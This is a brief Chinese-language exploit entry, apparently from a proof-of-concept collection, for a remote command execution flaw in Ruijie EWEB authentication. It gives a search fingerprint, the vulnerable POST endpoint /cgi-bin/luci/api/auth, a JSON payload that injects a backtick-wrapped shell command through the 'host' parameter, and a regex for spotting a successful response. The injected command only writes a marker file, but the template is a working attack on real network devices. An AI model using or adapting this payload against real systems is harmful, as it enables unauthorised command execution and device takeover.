# 锐捷EWEBauth远程命令执行漏洞

锐捷 ｜ 命令执行 ｜ —
- **指纹**：`body="cgi-bin/luci"`
- **请求**：`POST /cgi-bin/luci/api/auth HTTP/1.1`

**Payload**
```
{"method":"checkNet","params":{"host":"`echo dudesite>dudesite.txt`"}}
```
- **响应特征**：200 ^(?=.*?code)(?=.*?data).\*?$